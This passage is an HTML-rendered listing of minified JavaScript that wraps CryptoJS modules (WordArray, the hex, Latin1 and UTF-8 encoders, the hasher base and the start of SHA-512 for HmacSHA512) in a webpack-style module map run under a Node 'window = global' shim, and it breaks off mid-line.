class="line">5742</span><br><span class="line">5743</span><br><span class="line">5744</span><br><span class="line">5745</span><br><span class="line">5746</span><br><span class="line">5747</span><br><span class="line">5748</span><br><span class="line">5749</span><br><span class="line">5750</span><br><span class="line">5751</span><br><span class="line">5752</span><br><span class="line">5753</span><br><span class="line">5754</span><br><span class="line">5755</span><br><span class="line">5756</span><br><span class="line">5757</span><br><span class="line">5758</span><br><span class="line">5759</span><br><span class="line">5760</span><br><span class="line">5761</span><br><span class="line">5762</span><br><span class="line">5763</span><br><span class="line">5764</span><br><span class="line">5765</span><br><span class="line">5766</span><br><span class="line">5767</span><br><span class="line">5768</span><br><span class="line">5769</span><br><span class="line">5770</span><br><span class="line">5771</span><br><span class="line">5772</span><br><span class="line">5773</span><br><span class="line">5774</span><br><span class="line">5775</span><br><span class="line">5776</span><br><span class="line">5777</span><br><span class="line">5778</span><br><span class="line">5779</span><br><span class="line">5780</span><br><span class="line">5781</span><br><span class="line">5782</span><br><span class="line">5783</span><br><span class="line">5784</span><br><span class="line">5785</span><br><span class="line">5786</span><br><span class="line">5787</span><br><span class="line">5788</span><br><span class="line">5789</span><br><span class="line">5790</span><br><span class="line">5791</span><br><span class="line">5792</span><br><span class="line">5793</span><br><span class="line">5794</span><br><span class="line">5795</span><br><span class="line">5796</span><br><span class="line">5797</span><br><span class="line">5798</span><br><span class="line">5799</span><br><span class="line">5800</span><br><span class="line">5801</span><br><span class="line">5802</span><br><span class="line">5803</span><br><span class="line">5804</span><br><span class="line">5805</span><br><span class="line">5806</span><br><span class="line">5807</span><br><span class="line">5808</span><br><span class="line">5809</span><br><span class="line">5810</span><br><span class="line">5811</span><br><span class="line">5812</span><br><span class="line">5813</span><br><span class="line">5814</span><br><span class="line">5815</span><br><span class="line">5816</span><br><span class="line">5817</span><br><span class="line">5818</span><br><span class="line">5819</span><br><span class="line">5820</span><br><span class="line">5821</span><br><span class="line">5822</span><br><span class="line">5823</span><br><span class="line">5824</span><br><span class="line">5825</span><br><span class="line">5826</span><br><span class="line">5827</span><br><span class="line">5828</span><br><span class="line">5829</span><br><span class="line">5830</span><br><span class="line">5831</span><br><span class="line">5832</span><br><span class="line">5833</span><br><span class="line">5834</span><br><span class="line">5835</span><br><span class="line">5836</span><br><span class="line">5837</span><br><span class="line">5838</span><br><span class="line">5839</span><br><span class="line">5840</span><br><span class="line">5841</span><br><span class="line">5842</span><br><span class="line">5843</span><br><span class="line">5844</span><br><span class="line">5845</span><br><span class="line">5846</span><br><span class="line">5847</span><br><span class="line">5848</span><br><span class="line">5849</span><br><span class="line">5850</span><br><span class="line">5851</span><br><span class="line">5852</span><br><span class="line">5853</span><br><span class="line">5854</span><br><span class="line">5855</span><br><span class="line">5856</span><br><span class="line">5857</span><br><span class="line">5858</span><br><span class="line">5859</span><br><span class="line">5860</span><br><span class="line">5861</span><br><span class="line">5862</span><br><span class="line">5863</span><br><span class="line">5864</span><br><span class="line">5865</span><br><span class="line">5866</span><br><span class="line">5867</span><br><span class="line">5868</span><br><span class="line">5869</span><br><span class="line">5870</span><br><span class="line">5871</span><br><span class="line">5872</span><br><span class="line">5873</span><br><span class="line">5874</span><br><span class="line">5875</span><br><span class="line">5876</span><br><span class="line">5877</span><br><span class="line">5878</span><br><span class="line">5879</span><br><span class="line">5880</span><br><span class="line">5881</span><br><span class="line">5882</span><br><span class="line">5883</span><br><span class="line">5884</span><br><span class="line">5885</span><br><span class="line">5886</span><br><span class="line">5887</span><br><span class="line">5888</span><br><span class="line">5889</span><br><span class="line">5890</span><br><span class="line">5891</span><br><span class="line">5892</span><br><span class="line">5893</span><br><span class="line">5894</span><br><span class="line">5895</span><br><span class="line">5896</span><br><span class="line">5897</span><br><span class="line">5898</span><br><span class="line">5899</span><br><span class="line">5900</span><br><span class="line">5901</span><br><span class="line">5902</span><br><span class="line">5903</span><br><span class="line">5904</span><br><span class="line">5905</span><br><span class="line">5906</span><br><span class="line">5907</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">window</span> = <span class="variable language_">global</span>;</span><br><span class="line"><span class="keyword">var</span> rr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> aaa = &#123;</span><br><span class="line">    <span class="number">3817</span>: <span class="keyword">function</span> (<span class="params">t, e, a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n, i, s;</span><br><span class="line">        <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> globalThis ? globalThis : <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> self &amp;&amp; self,</span><br><span class="line">            i = [e, <span class="title function_">a</span>(<span class="number">5333</span>)],</span><br><span class="line">        <span class="keyword">void</span> <span class="number">0</span> === (s = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> (n = <span class="keyword">function</span> (<span class="params">n, i</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> s = <span class="title function_">a</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(n, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">                &#125;),</span><br><span class="line">                    n.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                    i = <span class="title function_">s</span>(i),</span><br><span class="line">                    n.<span class="property">default</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> (<span class="number">0</span>,</span><br><span class="line">                            i.<span class="property">default</span>)(t, e).<span class="title function_">toString</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                    ,</span><br><span class="line">                    t.<span class="property">exports</span> = e.<span class="property">default</span></span><br><span class="line">            &#125;</span><br><span class="line">        ) ? n.<span class="title function_">apply</span>(e, i) : n) || (t.<span class="property">exports</span> = s)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">5333</span>: <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r;</span><br><span class="line">        t.<span class="property">exports</span> = (r = <span class="title function_">n</span>(<span class="number">265</span>),</span><br><span class="line">            <span class="title function_">n</span>(<span class="number">3818</span>),</span><br><span class="line">            <span class="title function_">n</span>(<span class="number">5334</span>),</span><br><span class="line">            <span class="title function_">n</span>(<span class="number">5335</span>),</span><br><span class="line">            r.<span class="property">HmacSHA512</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">265</span>: <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r;</span><br><span class="line">        t.<span class="property">exports</span> = (r = r || <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title class_">Object</span>.<span class="property">create</span> || <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> n;</span><br><span class="line">                    <span class="keyword">return</span> t.<span class="property"><span class="keyword">prototype</span></span> = e,</span><br><span class="line">                        n = <span class="keyword">new</span> t,</span><br><span class="line">                        t.<span class="property"><span class="keyword">prototype</span></span> = <span class="literal">null</span>,</span><br><span class="line">                        n</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;()</span><br><span class="line">                , r = &#123;&#125;</span><br><span class="line">                , i = r.<span class="property">lib</span> = &#123;&#125;</span><br><span class="line">                , o = i.<span class="property">Base</span> = &#123;</span><br><span class="line">                <span class="attr">extend</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> e = <span class="title function_">n</span>(<span class="variable language_">this</span>);</span><br><span class="line">                    <span class="keyword">return</span> t &amp;&amp; e.<span class="title function_">mixIn</span>(t),</span><br><span class="line">                    e.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;init&quot;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">init</span> !== e.<span class="property">init</span> || (e.<span class="property">init</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                            e.<span class="property">$super</span>.<span class="property">init</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    ),</span><br><span class="line">                        e.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span> = e,</span><br><span class="line">                        e.<span class="property">$super</span> = <span class="variable language_">this</span>,</span><br><span class="line">                        e</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">create</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">extend</span>();</span><br><span class="line">                    <span class="keyword">return</span> t.<span class="property">init</span>.<span class="title function_">apply</span>(t, <span class="variable language_">arguments</span>),</span><br><span class="line">                        t</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">init</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">mixIn</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> e <span class="keyword">in</span> t)</span><br><span class="line">                        t.<span class="title function_">hasOwnProperty</span>(e) &amp;&amp; (<span class="variable language_">this</span>[e] = t[e]);</span><br><span class="line">                    t.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;toString&quot;</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">toString</span> = t.<span class="property">toString</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">clone</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">extend</span>(<span class="variable language_">this</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">                , a = i.<span class="property">WordArray</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">                <span class="attr">init</span>: <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                    t = <span class="variable language_">this</span>.<span class="property">words</span> = t || [],</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">sigBytes</span> = <span class="literal">null</span> != e ? e : <span class="number">4</span> * t.<span class="property">length</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">toString</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (t || s).<span class="title function_">stringify</span>(<span class="variable language_">this</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">concat</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">                        , n = t.<span class="property">words</span></span><br><span class="line">                        , r = <span class="variable language_">this</span>.<span class="property">sigBytes</span></span><br><span class="line">                        , i = t.<span class="property">sigBytes</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">clamp</span>(),</span><br><span class="line">                    r % <span class="number">4</span>)</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; i; o++) &#123;</span><br><span class="line">                            <span class="keyword">var</span> a = n[o &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - o % <span class="number">4</span> * <span class="number">8</span> &amp; <span class="number">255</span>;</span><br><span class="line">                            e[r + o &gt;&gt;&gt; <span class="number">2</span>] |= a &lt;&lt; <span class="number">24</span> - (r + o) % <span class="number">4</span> * <span class="number">8</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="keyword">for</span> (o = <span class="number">0</span>; o &lt; i; o += <span class="number">4</span>)</span><br><span class="line">                            e[r + o &gt;&gt;&gt; <span class="number">2</span>] = n[o &gt;&gt;&gt; <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">sigBytes</span> += i,</span><br><span class="line">                        <span class="variable language_">this</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">clamp</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">                        , n = <span class="variable language_">this</span>.<span class="property">sigBytes</span>;</span><br><span class="line">                    e[n &gt;&gt;&gt; <span class="number">2</span>] &amp;= <span class="number">4294967295</span> &lt;&lt; <span class="number">32</span> - n % <span class="number">4</span> * <span class="number">8</span>,</span><br><span class="line">                        e.<span class="property">length</span> = t.<span class="title function_">ceil</span>(n / <span class="number">4</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">clone</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> t = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">                    <span class="keyword">return</span> t.<span class="property">words</span> = <span class="variable language_">this</span>.<span class="property">words</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">                        t</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">random</span>: <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> n, r = [], i = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                        e = e;</span><br><span class="line">                        <span class="keyword">var</span> n = <span class="number">987654321</span></span><br><span class="line">                            , r = <span class="number">4294967295</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> i = ((n = <span class="number">36969</span> * (<span class="number">65535</span> &amp; n) + (n &gt;&gt; <span class="number">16</span>) &amp; r) &lt;&lt; <span class="number">16</span>) + (e = <span class="number">18e3</span> * (<span class="number">65535</span> &amp; e) + (e &gt;&gt; <span class="number">16</span>) &amp; r) &amp; r;</span><br><span class="line">                            <span class="keyword">return</span> i /= <span class="number">4294967296</span>,</span><br><span class="line">                            (i += <span class="number">.5</span>) * (t.<span class="title function_">random</span>() &gt; <span class="number">.5</span> ? <span class="number">1</span> : -<span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, o = <span class="number">0</span>; o &lt; e; o += <span class="number">4</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> c = <span class="title function_">i</span>(<span class="number">4294967296</span> * (n || t.<span class="title function_">random</span>()));</span><br><span class="line">                        n = <span class="number">987654071</span> * <span class="title function_">c</span>(),</span><br><span class="line">                            r.<span class="title function_">push</span>(<span class="number">4294967296</span> * <span class="title function_">c</span>() | <span class="number">0</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r, e)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">                , c = r.<span class="property">enc</span> = &#123;&#125;</span><br><span class="line">                , s = c.<span class="property">Hex</span> = &#123;</span><br><span class="line">                <span class="attr">stringify</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> e = t.<span class="property">words</span>, n = t.<span class="property">sigBytes</span>, r = [], i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> o = e[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - i % <span class="number">4</span> * <span class="number">8</span> &amp; <span class="number">255</span>;</span><br><span class="line">                        r.<span class="title function_">push</span>((o &gt;&gt;&gt; <span class="number">4</span>).<span class="title function_">toString</span>(<span class="number">16</span>)),</span><br><span class="line">                            r.<span class="title function_">push</span>((<span class="number">15</span> &amp; o).<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">parse</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> e = t.<span class="property">length</span>, n = [], r = <span class="number">0</span>; r &lt; e; r += <span class="number">2</span>)</span><br><span class="line">                        n[r &gt;&gt;&gt; <span class="number">3</span>] |= <span class="built_in">parseInt</span>(t.<span class="title function_">substr</span>(r, <span class="number">2</span>), <span class="number">16</span>) &lt;&lt; <span class="number">24</span> - r % <span class="number">8</span> * <span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(n, e / <span class="number">2</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">                , u = c.<span class="property">Latin1</span> = &#123;</span><br><span class="line">                <span class="attr">stringify</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> e = t.<span class="property">words</span>, n = t.<span class="property">sigBytes</span>, r = [], i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> o = e[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - i % <span class="number">4</span> * <span class="number">8</span> &amp; <span class="number">255</span>;</span><br><span class="line">                        r.<span class="title function_">push</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(o))</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">parse</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> e = t.<span class="property">length</span>, n = [], r = <span class="number">0</span>; r &lt; e; r++)</span><br><span class="line">                        n[r &gt;&gt;&gt; <span class="number">2</span>] |= (<span class="number">255</span> &amp; t.<span class="title function_">charCodeAt</span>(r)) &lt;&lt; <span class="number">24</span> - r % <span class="number">4</span> * <span class="number">8</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(n, e)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">                , l = c.<span class="property">Utf8</span> = &#123;</span><br><span class="line">                <span class="attr">stringify</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">escape</span>(u.<span class="title function_">stringify</span>(t)))</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Malformed UTF-8 data&quot;</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">parse</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> u.<span class="title function_">parse</span>(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(t)))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">                , h = i.<span class="property">BufferedBlockAlgorithm</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">                <span class="attr">reset</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">_data</span> = <span class="keyword">new</span> a.<span class="property">init</span>,</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> = <span class="number">0</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">_append</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t &amp;&amp; (t = l.<span class="title function_">parse</span>(t)),</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">concat</span>(t),</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> += t.<span class="property">sigBytes</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">_process</span>: <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> n = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">                        , r = n.<span class="property">words</span></span><br><span class="line">                        , i = n.<span class="property">sigBytes</span></span><br><span class="line">                        , o = <span class="variable language_">this</span>.<span class="property">blockSize</span></span><br><span class="line">                        , c = i / (<span class="number">4</span> * o)</span><br><span class="line">                        , s = (c = e ? t.<span class="title function_">ceil</span>(c) : t.<span class="title function_">max</span>((<span class="number">0</span> | c) - <span class="variable language_">this</span>.<span class="property">_minBufferSize</span>, <span class="number">0</span>)) * o</span><br><span class="line">                        , u = t.<span class="title function_">min</span>(<span class="number">4</span> * s, i);</span><br><span class="line">                    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">0</span>; l &lt; s; l += o)</span><br><span class="line">                            <span class="variable language_">this</span>.<span class="title function_">_doProcessBlock</span>(r, l);</span><br><span class="line">                        <span class="keyword">var</span> h = r.<span class="title function_">splice</span>(<span class="number">0</span>, s);</span><br><span class="line">                        n.<span class="property">sigBytes</span> -= u</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(h, u)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">clone</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> t = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">                    <span class="keyword">return</span> t.<span class="property">_data</span> = <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">clone</span>(),</span><br><span class="line">                        t</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">_minBufferSize</span>: <span class="number">0</span></span><br><span class="line">            &#125;)</span><br><span class="line">                , f = (i.<span class="property">Hasher</span> = h.<span class="title function_">extend</span>(&#123;</span><br><span class="line">                <span class="attr">cfg</span>: o.<span class="title function_">extend</span>(),</span><br><span class="line">                <span class="attr">init</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(t),</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">reset</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    h.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>),</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">_doReset</span>()</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">update</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_append</span>(t),</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">                        <span class="variable language_">this</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">finalize</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> t &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">_append</span>(t),</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">_doFinalize</span>()</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">blockSize</span>: <span class="number">16</span>,</span><br><span class="line">                <span class="attr">_createHelper</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e, n</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> t.<span class="title function_">init</span>(n).<span class="title function_">finalize</span>(e)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">_createHmacHelper</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e, n</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> f.<span class="property">HMAC</span>.<span class="title function_">init</span>(t, n).<span class="title function_">finalize</span>(e)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;),</span><br><span class="line">                r.<span class="property">algo</span> = &#123;&#125;);</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        &#125;(<span class="title class_">Math</span>),</span><br><span class="line">            r)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">3818</span>: <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r, i, o, a, c, s;</span><br><span class="line">        t.<span class="property">exports</span> = (s = <span class="title function_">n</span>(<span class="number">265</span>),</span><br><span class="line">            i = (r = s).<span class="property">lib</span>,</span><br><span class="line">            o = i.<span class="property">Base</span>,</span><br><span class="line">            a = i.<span class="property">WordArray</span>,</span><br><span class="line">            (c = r.<span class="property">x64</span> = &#123;&#125;).<span class="property">Word</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">                <span class="attr">init</span>: <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">high</span> = t,</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">low</span> = e</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;),</span><br><span class="line">            c.<span class="property">WordArray</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">                <span class="attr">init</span>: <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                    t = <span class="variable language_">this</span>.<span class="property">words</span> = t || [],</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">sigBytes</span> = <span class="literal">null</span> != e ? e : <span class="number">8</span> * t.<span class="property">length</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">toX32</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">words</span>, e = t.<span class="property">length</span>, n = [], r = <span class="number">0</span>; r &lt; e; r++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> i = t[r];</span><br><span class="line">                        n.<span class="title function_">push</span>(i.<span class="property">high</span>),</span><br><span class="line">                            n.<span class="title function_">push</span>(i.<span class="property">low</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> a.<span class="title function_">create</span>(n, <span class="variable language_">this</span>.<span class="property">sigBytes</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">clone</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> t = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>), e = t.<span class="property">words</span> = <span class="variable language_">this</span>.<span class="property">words</span>.<span class="title function_">slice</span>(<span class="number">0</span>), n = e.<span class="property">length</span>, r = <span class="number">0</span>; r &lt; n; r++)</span><br><span class="line">                        e[r] = e[r].<span class="title function_">clone</span>();</span><br><span class="line">                    <span class="keyword">return</span> t</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;),</span><br><span class="line">            s)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">5334</span>: <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r;</span><br><span class="line">        t.<span class="property">exports</span> = (r = <span class="title function_">n</span>(<span class="number">265</span>),</span><br><span class="line">            <span class="title function_">n</span>(<span class="number">3818</span>),</span><br><span class="line">            <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> t = r</span><br><span class="line">                    , e = t.<span class="property">lib</span>.<span class="property">Hasher</span></span><br><span class="line">                    , n = t.<span class="property">x64</span></span><br><span class="line">                    , i = n.<span class="property">Word</span></span><br><span class="line">                    , o = n.<span class="property">WordArray</span></span><br><span class="line">                    , a = t.<span class="property">algo</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">function</span> <span class="title function_">c</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> i.<span class="property">create</span>.<span class="title function_">apply</span>(i, <span class="variable language_">arguments</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> s = [<span class="title function_">c</span>(<span class="number">1116352408</span>, <span class="number">3609767458</span>), <span class="title function_">c</span>(<span class="number">1899447441</span>, <span 